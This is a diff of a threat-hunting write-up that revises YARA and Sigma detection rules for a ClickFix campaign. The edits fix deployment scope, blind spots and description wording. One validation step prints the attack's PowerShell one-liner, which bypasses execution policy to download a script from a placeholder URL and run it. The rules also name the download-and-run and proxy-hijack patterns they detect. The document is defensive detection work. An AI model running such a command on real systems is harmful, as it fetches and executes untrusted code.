@@ -85,7 +85,7 @@ rule Newdouble_ClickFix_SteamCDP_Loader_Strings {
 **False Positives:** None known for the build-path branch: a legitimate game overlay would not carry the `berserk_gamebaker` build path. The second branch needs no path, only three of the five hook-name and localisation strings. The hook names are ordinary identifiers, and the benign corpus checked held no Steam install (see the tier reason), so this branch has an uncharacterized false-positive profile.
 **Blind Spots:** Misses a rebuild with a stripped debug directory and renamed hooks. Matches the outer executable as well as the carved DLL, because the DLL is stored unencoded inside it; a DLL that is stored encoded is not seen until it is decoded in memory.
 **Validation:** Scan the carved DLL (SHA-256 `f6afe770...`) or the outer executable and confirm a hit. Scan a game overlay or a Dear ImGui sample application and confirm no hit.
-**Deployment:** File scan and memory scan (the DLL is a memory-scan seed); review hits, do not alert or block on them.
+**Deployment:** File scan only (the carved DLL and the outer executable on disk); The condition tests `filesize`, which is undefined in a process-memory scan, so the rule does not match there; a memory-scan form would need the `filesize` test removed and is not written or tested here. Review hits, do not alert or block on them.
 
 ```yara
 rule Newdouble_ClickFix_Berserk_Embedded_DLL_PDB_Hooks {
@@ -167,7 +167,7 @@ All six rules are Hunting and use `status: experimental`. Each carries an `stp.N
 **ATT&CK Note:** An existing upstream rule covers the Run dialog history on registry telemetry; this rule covers the same paste on process-creation telemetry and keys on the download-save-run shape of the command, not on the operator's URL.
 **Confidence:** MODERATE
 **False Positives:** An administrator pasting a download-and-run one-liner into the Run dialog; internal onboarding instructions that tell users to paste a script bootstrap command.
-**Blind Spots:** The five substrings are not ordered or bound together: a command line holding them in any order matches, including one that runs a different script from the one it saved. Misses a variant that splits the download and the run into separate commands, one that uses `curl.exe` or `Start-BitsTransfer` in place of `iwr`, and any delivery that does not go through the Run dialog (a terminal window opened by the victim has a different parent process).
+**Blind Spots:** The five substrings are not ordered or bound together: a command line holding them in any order matches, including one that runs a different script from the one it saved. Misses a variant that splits the download and the run into separate commands, one that uses `curl.exe` or `Start-BitsTransfer` in place of `iwr`, and any delivery in which the PowerShell process is not a child of Explorer (a terminal window opened by the victim has a different parent process). The test is Explorer parenthood and not Run-dialog provenance: a shortcut or double-click launched by Explorer with the same arguments produces the same fields and also matches.
 **Validation:** Paste the observed one-liner shape (`powershell -ep bypass -c "IWR <url> -OutFile $env:TEMP\x.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\x.ps1"`) into the Run dialog on a test host and confirm the rule fires on the outer process. Running the same text from an interactive PowerShell prompt must not fire it, because the parent is not `explorer.exe`.
 **Deployment:** Threat hunting over process-creation telemetry with the command line; not for alerting.
 
@@ -286,7 +286,7 @@ level: medium
 **ATT&CK Coverage:** T1059.001 (PowerShell)
 **Confidence:** LOW
 **False Positives:** PowerShell modules or profile scripts saved to the roaming profile by administrators; developer tooling that writes helper scripts under the roaming profile.
-**Blind Spots:** Misses a script copied by a different process, and any write outside the roaming profile. The subfolder test is a case-sensitive regex on `\AppData\Roaming\`, so a path written in another letter case is missed on regex-based backends. A script written directly into the roaming folder with no subfolder does not match.
+**Blind Spots:** Misses a script copied by a different process, and any write outside the roaming profile. The subfolder test is a regex on `\AppData\Roaming\` whose case behaviour depends on the backend: the EQL conversion emits `regex~`, which is case-insensitive, so a path written in another letter case still matches there, while a backend that applies the regex case-sensitively misses it. A script written directly into the roaming folder with no subfolder does not match.
 **Validation:** Run `Copy-Item` from a PowerShell prompt into `%APPDATA%\SomeFolder\test.ps1` and confirm the rule fires. The same copy to `%APPDATA%\test.ps1` (no subfolder) must NOT fire.
 **Deployment:** Threat hunting over file-creation telemetry; not for alerting.
 
@@ -349,9 +349,10 @@ status: experimental
 description: >-
     Detects a process running from a user AppData folder writing the ProxyServer,
     ProxyEnable or AutoConfigURL value under the per-user Internet Settings key.
-    A Steam-focused executable delivered by a ClickFix chain changes these values
-    as part of a traffic-interception setup. The values it writes were not
-    recovered, so the rule keys on the writer and the setting, not the data.
+    Static analysis of a Steam-focused executable delivered by a ClickFix chain
+    found code that can change these values as part of a traffic-interception
+    setup; the report does not record a completed change. The values it would
+    write were not recovered, so the rule keys on the writer and the setting, not the data.
 references:
     - https://the-hunters-ledger.com/hunting-detections/newdouble-clickfix-detections/
 author: The Hunters Ledger
